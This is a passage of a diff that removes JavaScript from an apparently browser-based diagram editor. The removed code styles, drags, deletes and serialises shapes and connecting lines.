-       }
-       else
-       {
-           bf = '';
-       }
-       if (this.isrect())
-       {
-           var tmp = this.basiccss();
-           if (inkframe) tmp = tmp.replace(/absolute/,'static');
-           tmp += ";border:" + fw + "px " + framecolor + " solid;box-shadow:" + boxshadow + "px " + boxshadow + "px grey;transform-origin:center;transform:rotate(" + this.slope + "deg);" + bf;
-           if (this.shapename== 'rightrect')
-           {
-               if (jj == 0)
-                   tmp += ";width:" + (wt+3+2*fw) + "px;height:" + (ht+3+2*fw) + "px;border-radius:0px;";
-               else
-                   tmp += ";width:" + (wt+3+2*fw) + "px;border-radius:0px";
-           }
-           else if (this.shapename== 'roundrect')
-           {
-               if (jj == 0)
-                   tmp += ";width:" + (wt+3+2*this.framew()) + "px;height:" + (ht+3+2*this.framew()) + "px;border-radius:" + (2.5*this.framew()) + "px;";
-               else
-                   tmp += ";width:" + (wt+3+2*this.framew()) + "px;border-radius:" + (2.5*this.framew()) + "px";
-           }
-           else if (this.shapename== 'circle')
-           {
-               if (jj == 1 && jj == 2)
-               {
-                   var sd = (ht < wt)?ht : wt;
-                   var mx = sd ;
-                   if (jj==2) mx *= 0.3;
-                   var tp = 0;
-                   var wd = 0;
-                   tmp += ";width:" + mx + "px;height:" + mx + "px;border-radius:50% / 50%;line-height:" + (mx-6) + "px;";
-               }
-               else if (jj == 3)
-               {
-                   tmp += ";border-radius:50%/50%;";
-               }
-               else
-               {
-                   var mx = Math.ceil(Math.sqrt(ht*ht+wt*wt))+2*fw;
-                   var tp = (mx - ht)/2;
-                   var wd = (mx - wt)/2;
-                   tmp += ";width:" + mx + "px;height:" + mx + "px;border-radius:50% / 50%;line-height:" + (mx-6) + "px;";
-               }
-
-           }
-           else if (this.shapename== 'ellipse')
-           {
-               if (jj == 0)
-                    tmp += "width:" + 1.45*(wt+2*fw) + "px;height:" + 1.45*(2*fw+ht) + "px;border-radius:50% / 50%;line-height:" +  1.45*(ht) + "px;";
-               else
-                    tmp += "width:" + (wt+2*fw) + "px;border-radius:50% / 50%;padding:0px 0px 0px 0px";
-           }
-           else if (this.shapename== 'egg')
-           {
-               if ( jj == 0)
-                   tmp += ";width:" + 1.5*(2*fw+wt) + "px;height:" + 1.5*(2*fw+ht) + "px;border-radius:50% 50% 50% 50%/ 60% 60% 40% 40%;line-height:" + 1.5*(ht) + "px;";
-               else
-                   tmp += ";width:" + (wt+2*fw) + "px;border-radius:50% 50% 50% 50%/ 60% 60% 40% 40%;";
-           }
-
-       }
-       else if (this.shapename== 'diamond')
-       {
-           
-           var rt = wt/ht;
-           if (jj == 0)
-              tmp = this.basiccss() + ";width:" + (2*(wt+fw)) + "px;height:" + (2*(ht+fw)) + "px;line-height:" + ((ht)*2) + "px;transform:rotate(" + this.slope + "deg)";
-           else
-              tmp = this.basiccss() + ";width:" + (wt+fw) + "px;transform:rotate(" + this.slope + "deg)";
-       }
-       else   if (this.shapename== 'hexgon')
-       {
-           var mt =  ((wt>ht)?wt:ht);
-           mt *= 1.3;
-           if (jj == 0)
-               tmp = this.basiccss() + ";line-height:" + (mt-fw) + "px;;width:" + (2*mt/1.732) + "px;height:" + mt + "px;transform:rotate(" + this.slope + "deg);";
-           else
-               tmp = this.basiccss() + ";width:" + (wt) + "px;transform:rotate(" + this.slope + "deg)";
-
-       }
-       else   if (this.shapename== 'clouds')
-       {
-           if (jj==0)
-               tmp = this.basiccss() +  ";width:" + (1.5*wt) + "px;height:" + (1.5*ht) + "px;line-height:" + (1.5*ht-fw) + "px;";
-           else
-               tmp = this.basiccss() + ";width:" + (wt) + "px;transform:rotate(" + this.slope + "deg)";
-
-       }
-       return tmp;
-   }
-   this.init = function()
-   {
-       if (inkframe)
-       {
-           if ($('w' + this.num) !=null)   
-               this.base.removeChild($('w' + this.num));
-       }
-       else
-       {
-           if ($('g' + this.num) !=null)   this.base.removeChild($('g' + this.num));
-       }
-       var wt = this.width ;
-       var ht = this.height ;
-       var fw  = this.framew();
-       var framecolor =  colors[this.color];
-       if ((this.fc & 1) == 1)
-       {
-           framecolor = bcolors[this.bcolor];
-           fw = 0;
-       }
-       var boxshadow = ((this.fc & 2) > 0)?1:0;
-       if (this.bcolor < 9)
-       {
-       if ( (this.fc & 8 ) > 0  )
-           var bf = "background-image:" + gradient(bcolors[this.bcolor],this.shapename) + ";";
-       else
-           bf = 'background-color:' + bcolors[this.bcolor] + ";";
-       }
-       else
-       {
-           bf = '';
-       }
-       var tmp = this.basecss();
-       if (inkframe) {
-           tmp = tmp.replace(/absolute/,'static');
-          
-       }
-       var jj = this.ispic =  this.onlyimg();
-       if (jj>0)
-       {
-           if (jj==1 || jj==3 )
-           {
-               this.base.style.cssText = tmp;
-           }
-           this.ellipseimg();
-       }
-       else if (this.isrect())
-       {
-           var  bb = 'p'; if (inkframe) bb = 'v';
-           this.base.style.cssText = tmp;
-           if (this.bcolor>10)
-               this.base.className = 'shapebg' + (this.bcolor-10);
-           else
-               this.base.className = null;
-           if (this.shapename=='rightrect')
-           {
-
-               var tbls = $(bb+this.num).getElementsByTagName('table');
-               if (tbls!=null)for (var i=0; i < tbls.length; i++)
-               {
-                   tbls[i].style.borderRadius = '0px';
-                   tbls[i].style.borderCollapse = 'collapse';
-                   tbls[i].style.borderColor = colors[this.color];
-                   tbls[i].style.borderWidth = '1px';
-                   tbls[i].cellSpacing = '0px';
-                   tbls[i].cellPadding = '2px';
-               }
-           }
-           else
-           {
-               var tbls = $(bb+this.num).getElementsByTagName('table');
-               if (tbls!=null)for (var i=0; i < tbls.length; i++)
-               {
-                   tbls[i].style.borderRadius = '4px';
-                   tbls[i].style.borderCollapse = null;
-                   tbls[i].style.borderColor = colors[this.color];
-                   tbls[i].style.borderWidth = '1px';
-                   tbls[i].cellSpacing = '0px';
-                   tbls[i].cellPadding = '2px';
-               }
-           }
-       }
-       else if (this.shapename== 'diamond')
-       {
-           this.base.style.cssText = tmp; 
-           var q = document.createElement('div');
-           var bb ='g';
-           if (inkframe) bb = 'w';
-           q.id = bb + this.num;
-           q.style.cssText = "position:absolute;top:0px;left:0px;height:" + (2*ht) + "px;transform:scaleX(" + (wt/ht) + ");transform-origin:0%;width:" + (2*ht) + "px;z-index:-2";
-           q.innerHTML = "<div  " + (this.bcolor>10?("class=shapebg" + (this.bcolor-10)):"") + "  style=\"" + bf   + "border:" + fw + "px " + framecolor + " solid;box-shadow:" + boxshadow + "px " + boxshadow + "px grey;height:"+ ((2*ht-fw)/1.4142) +"px;width:"+ (2*(ht-fw)/1.4142) +"px;transform:rotate(45deg);transform-origin:35.5% 84%\"></div>";
-           this.base.appendChild(q);
-           this.base.style.vertialAlign =   'middle';
-       }
-       else   if (this.shapename== 'hexgon')
-       {
-           this.base.style.cssText = tmp;
-           var q = document.createElement('div');
-           var bb ='g';
-           if (inkframe) bb = 'w';
-           q.id = bb + this.num;
-           var mt = wt; if (ht > wt) mt = ht;
-           mt *= 1.3;
-           var hasframe = ((this.fc & 1) == 0)?1:0;
-
-           q.style.cssText =  "position:relative;margin:-" +  (mt ) + "px 0px 0px 0px;z-index:-2";
-           if (this.bcolor>10)
-           {
-               var qq = "";
-               var twocolors = ["transparent","transparent"]
-           }
-           else
-           {
-
-               twocolors = [bcolors[this.bcolor],bcolors[this.bcolor]];
-               if ( (this.fc & 8 ) > 0  )
-                   twocolors = bf.replace(/[^#]+(#[0-9|a-f]+)[^#]+(#[0-9|a-f]+).*/, "$1,$2").split(/,/);
-               qq = bf.replace(/\(/,'(to right,');
-           }
-           if( bf!='')
-           q.innerHTML = "<table cellpadding=0 cellspacing=0><tr><td><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-           +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-right-color:" + twocolors[0] + ";border-right-width:"
-           + (mt/2/1.732) + "px;border-right-style:solid;border-right-style:solid;border-top-style:solid;border-bottom-style:solid;></div></td><td   width=" +((mt/1.732)) + " style=\""
-           + bf.replace(/\(/,'(to right,') + "\"><!----></td><td><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-           +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-left-color:" + twocolors[1]+ ";border-left-width:"
-           + (mt/2/1.732) + "px;border-left-style:solid;border-bottom-style:solid;border-top-style:solid;></div></td></tr></table>";
-           else
-           q.innerHTML = "<table cellpadding=0 cellspacing=0><tr><td width=" + (mt/2/1.732) + "px><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-           +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-right-color:" + twocolors[0] + ";border-right-width:"
-           + (mt/2/1.732) + "px;border-right-style:solid;border-right-style:solid;border-top-style:solid;border-bottom-style:solid;></div></td><td  class=shapebg" + (this.bcolor-10)  + " width=" +((mt/1.732))
-           +  "><div class=shapebg" + (this.bcolor-10)  + " style=\"margin:-1px 0px 0px  0px;height:" + mt + "px;width:" +((mt/1.732))
-           +  "px;\"><!----></div><div class=shapebg" + (this.bcolor-10)  + " style=\"z-index:-3;margin:-" + (mt) + "px 0px 0px  0px;height:" + mt + "px;width:" +((mt/1.732))
-           +  "px;transform:rotate(60deg)\"><!----></div><div class=shapebg" + (this.bcolor-10)  + " style=\"z-index:-3;margin:-" + (mt) + "px 0px 0px 0px;height:" + mt + "px;width:" +((mt/1.732))
-           +  "px;transform:rotate(-60deg)\"><!----></div></td><td width=" + (mt/2/1.732) + "px><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-           +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-left-color:" + twocolors[1]+ ";border-left-width:"
-           + (mt/2/1.732) + "px;border-left-style:solid;border-bottom-style:solid;border-top-style:solid;></div></td></tr></table>";
-
-           this.base.appendChild(q);
-           if (hasframe > 0)
-           {
-               q = document.createElement('div');
-               var bb ='f';
-               if (inkframe) bb = 'x';
-               q.id = bb + this.num;
-               var fw = this.framew();
-               mt += 2*fw;
-               q.style.cssText =  "position:relative;margin:-" +  (mt-fw) + "px  -" +  fw + "px  -" +  fw + "px -" +  fw + "px;z-index:-3";
-               q.innerHTML = "<table cellpadding=0 cellspacing=0><tr><td><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-               +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-right-color:" + colors[this.color] +";border-right-width:"
-               + (mt/2/1.732) + "px;border-right-style:solid;border-right-style:solid;border-top-style:solid;border-bottom-style:solid;></div></td><td  width=" + (mt/1.732) + " style=background-color:" + colors[this.color] +"><!----></td><td><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-               +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-left-color:" + colors[this.color] +";border-left-width:"
-               + (mt/2/1.732) + "px;border-left-style:solid;border-bottom-style:solid;border-top-style:solid;></div></td></tr></table>";
-               this.base.appendChild(q);
-           }
-           var boxshadow = ((this.fc & 2) > 0)?1:0;
-           if (boxshadow > 0)
-           {
-               q = document.createElement('div');
-               var bb ='h';
-           if (inkframe) bb = 'y';
-               q.id = bb + this.num;
-               var fw = this.framew()*2/3;
-               q.style.cssText =  "position:relative;margin:-" +  (mt - fw/2) + "px  -" +  fw*3/2 + "px  " +  fw + "px " +  fw/2 + "px;z-index:-4";
-
-               q.innerHTML = "<table cellpadding=0 cellspacing=0><tr><td><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-               +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-right-color:#777;border-right-width:"
-               + (mt/2/1.732) + "px;border-right-style:solid;border-right-style:solid;border-top-style:solid;border-bottom-style:solid;></div></td><td  width=" + (mt/1.732) + " style=background-color:#777 ><!----></td><td><div style=width:0xp;height:0px;border-top-color:transparent;border-top-width:" + (mt/2)
-               +"px;border-bottom-color:transparent;border-bottom-width:" + (mt/2) + "px;border-left-color:#777;border-left-width:"
-               + (mt/2/1.732) + "px;border-left-style:solid;border-bottom-style:solid;border-top-style:solid;></div></td></tr></table>";
-               this.base.appendChild(q);
-           }
-
-            
-       }
-       else   if (this.shapename== 'clouds')
-       {
-           var boxshadow = ((this.fc & 2) > 0)?1:0;
-           this.base.style.cssText = tmp;;
-           var q = document.createElement('div');
-           var bb ='g';
-           if (inkframe) bb = 'w';
-           q.id = bb + this.num;
-           q.style.cssText = "transform:scale(" + (1.5*wt/150) + "," + (1.5*ht/88) + ");transform-origin:0% 0%;height:88px;overflow:hidden;width:150px;position:relative;color:" + bcolors[this.bcolor] + ";margin:-" + (1.69*ht) + "px 0px 0px -0px;z-index:-2";
-           q.innerHTML = "<div style=\"text-shadow:"  + boxshadow + "px " + boxshadow + "px grey;color:inherit;border:0px grey outset;font-size:167px;line-height:129px;width:150px\">&#x2601;</div></div>";
-           this.base.appendChild(q);
-       }
-
-       this.base.style.fontSize =  (this.fontsize+1) +  'px';
-       numbeing = this.num;
-       this.inediting = false;
-       shapenamebeing = this.shapename;
-   }
-
-
-
-   this.positionbyfn = function(fn)
-   {
-       var s = this.words.split(/\n/);
-       for (var i=0; i < s.length; i++)
-       {
-           if (s[i].replace(/<[^>]+>/g,'') == fn) return (i-0.5)/s.length;
-       }
-       return 0.5;
-   }
-
-   this.inbase = function(bx,by)
-   {
-       if (this.shapename== 'egg'||this.shapename== 'ellipse'||this.shapename== 'circle')
-       {
-           var w =  this.base.offsetWidth;
-           var h =  this.base.offsetHeight;
-           var x = bx - this.x - w/2 ;
-           var y = by - this.y - h/2;
-           var D = x*x/w/w + y*y/h/h;
-
-           return (  D <= 0.25);
-       }
-       else if (this.shapename== 'diamond')
-       {
-           w =  this.base.offsetWidth;
-           h =  this.base.offsetHeight;
-           x = bx - this.x - w/2 ;
-           y = by - this.y - h/2;
-           D =  Math.abs(x/w) + Math.abs(y/h) ;
-           return (D <= 0.5);
-       }
-       else
-       {
-           w =  this.base.offsetWidth;
-           h =  this.base.offsetHeight;
-           x = bx - this.x ;
-           y = by - this.y ;
-
-           return ( x>=0 && x <=w && y >=0 && y <=h);
-       }
-   }
-
-   this.extract = function(str,nm)
-   {
-      var j= str.indexOf(nm + ":");
-      if (j ==-1) return null;
-      var k= str.indexOf(";", j);
-      if (k>-1)
-          return str.substring(j+nm.length+1,k);
-      return str.substring(j+nm.length+1);
-   }
-   this.ellipseimg = function()
-   {
-       var j = this.ispic;
-       if ( j==1)
-       {
-          this.base.innerHTML = '';
-          var cln = this.words.replace(new RegExp("\\[" + textmsg[1303] + "([0-9]+)\\]","i"),'imagelet$1')  ;
-          this.base.className = cln;
-
-          if (this.shapename == 'circle')
-          {
-              this.base.style.width = this.width + 'px';
-              this.base.style.height = this.width + 'px';
-          }
-
-          return true;
-       }
-       else if (j==2)
-       {
-          var zz = this.basecss();
-          this.base.style.border = '0px';
-          this.base.style.boxShadow = '0px 0px white';
-          this.base.style.background = null;
-          this.base.style.backgroundColor = 'transparent';
-          this.base.style.transform = this.extract(zz,"transform");
-          this.base.style.left = this.x + "px";
-          this.base.style.top = this.y + "px";
-          this.base.style.position = "absolute";
-          this.base.style.boxSizing= 'border-box';
-          this.base.style.display = 'inline-block';
-          var p = this.base.getElementsByTagName('img')[0];
-          p.id = 'p' + this.num;
-          p.style.boxShadow = this.extract(zz,"box-shadow");
-          p.style.border = this.extract(zz,"border");
-          var ht = null;
-          var wd = null;
-          var ww = 0, wws;
-          try{ht = parseFloat(this.extract(zz,"height").replace(/px/,''));}catch(e){}
-          try{wd = parseFloat(this.extract(zz,"width").replace(/px/,''));}catch(e){}
-          try{ wws = this.urlas.replace(/^1/,'').replace(/_/,'');}catch(e){}
-          if (!isNaN(wws)) ww = parseFloat(wws);
-          if (ww > 0 && ht!=null ) { ht *= ww/wd; }
-          if (ww > 0) wd = ww;
-          if (ht!=null) p.style.height = ht + 'px'; else  p.style.height = null;
-          if (wd!=null) p.style.width = wd + 'px';  else  p.style.width = null;
-
-          p.style.borderRadius = this.extract(zz,"border-radius");
-
-          return true;
-       }
-       else if (j==3) return true;
-       return false;
-   }
-
-   this.onDragEnd = function(x,y)
-   {
-
-       if (this.inediting || this.validdrag == false) return;
-
-       if (Math.abs(x) + Math.abs(y) > 10)
-       {
-           sendObject(this.num);
-       }
-       if (Math.abs(x) + Math.abs(y) > 0)
-       {
-        for (var i=0; i < allLines.length; i++)
-        {
-           if (allLines[i]!=null && (allLines[i].startnum== this.num || allLines[i].endnum== this.num ))
-           {
-               allLines[i].redraw();
-           }
-        }
-       }
-       var p = whichally(this.num,1);
-
-       if (p > -1)
-       {
-           var ns = allies[pagenum][p].split(/,/);
-           for (var j=0; j < ns.length; j++)
-           if (ns[j] != ''+ this.num)
-           {
-               var ll = parseInt(ns[j]);
-               var obj = allShapes[ll];
-               obj.x += x;
-               obj.y += y;
-               obj.base.style.left = (  obj.x) + 'px';
-               obj.base.style.top  = (  obj.y) + 'px';
-
-               for (var i=0; i < allLines.length; i++)
-               {
-                   if (allLines[i]!=null && (allLines[i].startnum== obj.num || allLines[i].endnum== obj.num ))
-                   {
-                       allLines[i].redraw();
-                   }
-               }
-           }
-       }
-       document.onmousemove = onmouseover0;
-   }
-
-
-
-   this.delme = function(needcomfirm)
-   {
-      if (typeof(LaTexHTML)!='undefined')
-      LaTexHTML.deformat(this.base);
-      if (needcomfirm!=null && saveable()  && this.words!=null &&  this.words.indexOf("<img ") >= 0)
-      {
-          var im = this.base.getElementsByTagName("img")[0].alt;
-
-          if (im.src.indexOf(originalurl + "/FileOperation?did=") >=0
-           && confirm(textmsg[1662].replace(/#/,  im)))
-              delpic(this.num, im);
-      }
-      if (this.base!=null)
-      document.body.removeChild( this.base);
-      
-      if (allies[pagenum]!=null)
-      {
-          for (var k=allies[pagenum].length-1; k >= 0; k--)
-          {
-             allies[pagenum][k] = ("," + allies[pagenum][k] + ",").replace(new RegExp("," + this.num + ","), ",").replace(/^,/,'').replace(/,$/,'');
-             if (allies[pagenum][k] == '') 
-                 allies[pagenum].splice(k,1);
-             else
-                 for (var j=this.num; j < allShapes.length-1; j++)
-                    allies[pagenum][k] = ("," + allies[pagenum][k] + ",").replace(new RegExp("," + (j+1) + ","), "," + i + ",").replace(/^,/,'').replace(/,$/,'');
-               
-          }
-      }
-      for (var i=allLines.length-1; i >=0; i--)
-      {
-           if (allLines[i]!=null && (allLines[i].startnum== this.num || allLines[i].endnum== this.num ))
-           {
-               allLines[i].delme();
-           }
-          for (var j=this.num; j < allShapes.length-1; j++)
-          { if (allLines[i]!=null && allLines[i].startnum== j+1)// || allLines[i].endnum== this.num ))
-           {
-               allLines[i].startnum = j;
-           }
-           if (allLines[i]!=null && allLines[i].endnum== j+1)// || allLines[i].endnum== this.num ))
-           {
-               allLines[i].endnum = j;
-           }
-         }
-      }
-      if (numsselected!=null) 
-      {
-          var l =0;
-          for (; l < numsselected.length && numsselected[l]!=this.num; l++);
-          if (l < numsselected[l])numsselected.splice(l,1);
-          for (; l < numsselected.length; l++)
-          {
-             if (numsselected[l] > this.num)
-                 numsselected[l] = numsselected[l] - 1;
-          }
-      }
-      allShapes.splice(this.num,1);
-      numShapes = allShapes.length;
-      var k = kframes[pagenum + '_' + this.num];
-      if (k!=null) delete kframes[pagenum + '_' + this.num];
-      for (var j=this.num; j < allShapes.length; j++)
-      {
-          allShapes[j].num--;
-          $('b'+(j+1)).id = 'b' + j;
-          var pp = $('p'+ (j+1));
-          if (pp!=null)pp.id = 'p' + j; 
-          pp = $('g'+(j+1))
-          if (pp!=null) pp.id = 'g' + j; 
-          pp = $('f' + (j+1));
-          if (pp!=null) pp.id = 'f' + j;
-          var k = kframes[pagenum + '_' + (j+1)];
-          if (k!=null)
-          {
-              kframes[pagenum + '_' + (j)] =   copyk(k);
-              delete kframes[pagenum + '_' + (j+1)]; 
-          }
-      } 
-   }
-   
-   
-   this.toString = function()
-   {
-       if (ismakingtab != 1) return null;
-       if (this.words == null)
-           this.words = "";
-
-       if (this.shapename == null) this.shapename = 'rightrect';
-       var yy  = parseInt(this.base.style.top.replace(/px/,''));
-       var xx  = parseInt(this.base.style.left.replace(/px/,''));
-       var ww = '';
-       if (this.width !=null)
-           ww = this.width;
-       else
-           ww = this.base.offsetWidth;
-       var hh = '';
-       if (this.height !=null)
-           hh = this.height;
-       else
-           hh = this.base.offsetHeight;
-       var str ;
-       if (this.words.indexOf(",") >= 0 || this.words.indexOf("\n") >= 0 || this.words.indexOf("\r") >= 0)
-           str = "'" + this.words.replace(/'/g, "''") + "',";
-       else
-           str = this.words + ",";
-        ;
-       str += this.urlas + ",";
-       str += this.shapename  +"," +  xx +"," + yy + "," + ww + "," + hh +","
-          + this.fontsize + ",'" + (this.color) + "','" + this.bcolor + "'," + this.fc + "," + this.time.toFixed(3)+ "," + this.zindex + "," + this.start.toFixed(3) + ",'" + this.fontfamily + "'," + this.inediting + "," + this.slope;
-
-       return str;
-   }
-
-   this.showresize = function(pic)
-   {
-       pic.id = "z" + this.num;
-       {
-           this.base.onmouseover = function()
-           {
-               var num = parseInt(this.id.substring(1));
-               showanchor($("z"+num), this, 'se');
-           }
-       }
-
-   }
-   this.resizeit = function()
-   {
-       var ims = this.base.getElementsByTagName("img");
-       if (this.ispic == 2)
-       {
-          ims[0].onload = function()
-          {
-               var sp = allShapes[parseInt(this.parentNode.id.substring(1))];
-               sp.height = this.offsetHeight;
-               sp.width = this.offsetWidth;
-               sp.init();
-          }
-       }
-       else if ( ( ims = this.base.getElementsByTagName("iframe") ) !=null && ims.length >0)
-       {
-           this.showresize(ims[0]);
-       }
-       else if ( ( ims = this.base.getElementsByTagName("embed") ) !=null && ims.length >0)
-       {
-           this.showresize(ims[0]);
-       }
-
-   }
-
-
-   this.getdim = function()
-   {
-      this.width = this.base.offsetWidth;
-      this.height = this.base.offsetHeight;
-   }
- 
-
-   this.setup = function()
-   {
-       this.resizeit();
-       allShapes[this.num] = this;
-       numShapes = allShapes.length;
-       numbeing = this.num;
-       this.inediting = false;
-       shapenamebeing = this.shapename;
-       if (mfavory < this.base.offsetHeight)
-           mfavory = this.base.offsetHeight;
-       if (mfavory < this.height)
-           mfavory = this.height;
-       var mw = this.base.offsetWidth;
-       if (mw < this.width ) mw = this.width;
-       favorx += 10 + mw;
-       if (favorx > 800)
-       {
-           favory += mfavory + 10;
-           favorx = 5;
-          mfavory = 0;
-       }
-       Drag.init(this.base);
-       this.base.onDragStart = function(x,y)
-       {
-           document.onmousemove = onmouseover0;
-           var sp = allShapes[parseInt(this.id.substring(1))];
-           if (sp==null || sp.inediting) return;
-           sp.bx = x;
-           sp.by = y;
-           if (state>0)
-               sp.validdrag = false;
-           else
-               sp.validdrag = sp.inbase(myHintx, myHinty);
-
-           sp.x =  parseInt(sp.base.style.left.replace(/px/,''));
-           sp.y =  parseInt(sp.base.style.top.replace(/px/,''));
-
-       }
-       var xx = $('p' + this.num);
-       if (xx!=null)
-       xx.onresize = function()
-       {
-          var sp = allShapes[parseInt(this.id.substring(1))];
-          sp.resize();
-          sp.width = this.offsetWidth;
-          sp.height = this.offsetHeight;
-          sp.init();
-       }
-
-       this.base.onDragEnd = function(x,y)
-       {
-           document.onmousemove = onmouseover0;
-           var sp = allShapes[parseInt(this.id.substring(1))];
-           if (y>=-2&&y<3 && chatsessionnum==-1){saveit();activesave=true;}
-           if ( state>0) // bounce back
-           {
-               this.style.left = sp.bx + 'px';
-               this.style.top  = sp.by + 'px';
-               sp.x = sp.bx;
-               sp.y = sp.by;
-               begindraw(sp.base);
-               return;
-           }
-           if (document.onclick !=null) return;
-           var diffx  = x - sp.bx;
-           var diffy =  y - sp.by;
-         
-           if (  Math.abs(diffx) + Math.abs(diffy) > 4)
-           {
-               sp.x = x;
-               sp.y = y;
-               sp.onDragEnd(diffx,diffy);
-               hassaved = false;
-           }
-           else
-           {
-               var n = parseInt(this.id.substring(1));
-             
-               if (!editable && myHintx - sp.x < this.offsetWidth/6  )
-               {
-                   sp.scale=sp.scale/1.5;
-                   if (this.style.transform == null || this.style.transform == '')
-                       this.style.transform = "scale(" + sp.scale + "," + sp.scale + ")";
-                   else 
-                       this.style.transform = this.style.transform.replace(/scale[^\)]+\)/,'').replace(/ /,'') + " scale(" + sp.scale + "," + sp.scale + ")";
-               }
-               else if (!editable && sp.x + this.offsetWidth - myHintx < this.offsetWidth/6 )
-               {
-                   sp.scale=sp.scale*1.5;
-                        if (this.style.transform == null || this.style.transform == '')
-                       this.style.transform = "scale(" + sp.scale + "," + sp.scale + ")";
-                   else 
-                       this.style.transform = this.style.transform.replace(/scale[^\)]+\)/,'').replace(/ /,'') + " scale(" + sp.scale + "," + sp.scale + ")";
-               
-               }
-               else
-               {
-                   mdia(n,1);
-               }
-           }
-
-           document.onmousemove = onmouseover0;
-       }
-       
-        
-       this.scale = 1; 
-        
-       this.base.onmouseenter = function()
-       {
-           var num = parseInt(this.id.substring(1));
-           var sp = allShapes[num];
-           if (sp==null) return;
-           var wdd = sp.dotposition();
-
-           if (state == 0)// && this.offsetHeight > 2*wdd[1] + sp.height + sp.framew()*2)
-           {
-               var q = $('p' + num);
-               if (q!=null && sp.height < q.offsetHeight )
-               {
-                   sp.resize();
-                   sp.height = q.offsetHeight+3;
-                   sp.width = q.offsetWidth+3;
-                   q.style.fontSize = sp.fontsize + 'px';
-                   sp.init();
-               }
-           }
-           else if (state == 1 || state == 2)
-           {
-               objentering = num;
-               allShapes[num].noshape();
-               allShapes[num].onshape = false;
-           }
-           this.style.fontSize =  sp.fontsize +  'px';
-
-       }
-       this.base.onmouseout = function()
-       {
-
-           if (state == 1 || state == 2)
-           {
-               var num = parseInt(this.id.substring(1));
-               var sp = allShapes[num];
-               objentering = -1;
-               allShapes[num].toshape();
-               allShapes[num].onshape = true;
-           }
-
-       }
-
-   }
-   this.reinit = function()
-   {
-       done(this.num);
-   }
-   
-}
-
-function toString()
-{
-    var s = "";
-    var map = new Array();
-    var k = numShapes;
-    for (var i=0; i < k; i++)
-    {
-        if (allShapes[i] != null)
-        {
-           s += allShapes[i].toString() + "\n";
-           map[i] = i;
-        }
-        else
-        {
-           while (k>=1 && allShapes[k-1] == null)
-              k--;
-           if (i >= k)
-           {
-               break;
-           }
-           map[k-1] = i;
-           s += allShapes[--k].toString() + "\n";
-        }
-    }
-    s += "A\n";
-    if (allLines!=null)
-    for (i=0; i < allLines.length; i++)
-    {
-       if (allLines[i]!=null)
-       s += allLines[i].toString(map) + "\n";
-    }
-    return s;
-}
-function delall()
-{
-    if (allLines!=null)
-    {
-        for (i=0; i < allLines.length; i++)
-        {
-            if (allLines[i] != null)
-            {
-                allLines[i].delme();
-                allLines[i] = null;
-            }
-        }
-    }
-    if (allCurves!=null)
-    {
-        for (i=0; i < allCurves.length; i++)
-        {
-            if (allCurves[i] != null)
-            {
-                allCurves[i].delme();
-                allCurves[i] = null;
-            }
-        }
-    }
-    if (allShapes!=null)
-    {
-        
-        for (var i=allShapes.length-1; i >= 0; i--)
-        {
-            if (allShapes[i] != null)
-            {
-                allShapes[i].delme();
-            }
-        }
-    }
-
-
-    numShapes = 0;
-    numLines = 0;
-
-}
-
-function Line(ordernum,type,startnum,sx,sy,endnum,ex,ey,thick,direct,start, time,cl,zi)
-{
-   if (ordernum == null)
-      this.num = numLines;
-   else
-      this.num = ordernum;
-   numLines++;
-   allLines[this.num] = this;
-   this.startnum = startnum;
-   this.sx = sx;
-   this.sy = sy;
-   this.endnum = endnum;
-   this.ex = ex;
-   this.ey = ey;
-   this.direct = direct;
-   this.type = type;
-   this.thick = thick;
-   this.time = time;
-   this.start = start;
-   if (zi==null) zi=0;
-   this.zindex = zi;
-   this.k = 0;
-   this.color = cachedlinecolor;
-   if (cl != null && cl != '')
-   {
-       this.color = cl;
-   }
-   this.x = 0;
-   this.y = 0;
-   this.visible = 0;
-   this.toString = function(map)
-   {
-       var  sn = this.startnum;
-       var  en = this.endnum;
-       if (map != null)
-       {
-            sn = map[this.startnum];
-            en = map[this.endnum];
-       }
-
-       if (sn == null) sn = -1;
-       if( en == null) en = -1;
-       var s =    this.type + "," + sn + "," + this.sx.toFixed(2) + "," + this.sy.toFixed(7)
-       + ","  + en + "," + this.ex.toFixed(2) + "," + this.ey.toFixed(7) + "," + this.thick + "," + this.direct+ "," + this.start + "_" + this.time + "," +  this.color + "," + this.zindex;
-       return s;
-   }
-   this.lineends = function(sobj, target,yy)
-   {
-            if (sobj==null) return null;
-            var B;
-            var adj = 0;
-             
-            if (sobj.shapename == 'diamond' )
-                adj = 1;//this.thick;
-             else if (this.direct%2==0 && sobj.shapename == 'circle')
-            {
-                var x = sobj.x, r = sobj.base.offsetWidth/2,y = sobj.y, 
-                    d = Math.sqrt((target[0]-x-r)*(target[0]-x-r) + (target[1]-y-r)*(target[1]-y-r));
-                var x1 = (target[0]-x-r)*r/d  + r + x;
-                var y1 = (target[1]-y-r)*r/d  + r + y;
-                return [[x1,y1]];
-            }
-              
-            var xy = sobj.dotposition();
-            var wdd = sobj.shapewidth();
-            var hh = sobj.base.offsetHeight;
-            //var h1 = $('g' + this.endnum);
-            //if (h1!=null ) hh = h1.offsetHeight;
-            //if (hh < wdd*sobj.height + sobj.framew())   hh = wdd*sobj.height+ sobj.framew();
-             var pa = (hh - sobj.height)/2;
-
-            if (sobj.ispic == 2)
-            {
-               sobj.noshape();
-               var img = sobj.base.getElementsByTagName('img')[0];
-               var xy = findPositionnoScrolling(img);
-
-               var xyx = [img.offsetWidth,img.offsetHeight];
-               var kk = 0.5;
-               if (sobj.shapename=='egg') kk = 0.60;
-               B = [
-                  [xy[0],xy[1]+xyx[1]*kk],
-                  [xy[0]+xyx[0],xy[1]+xyx[1]*kk],
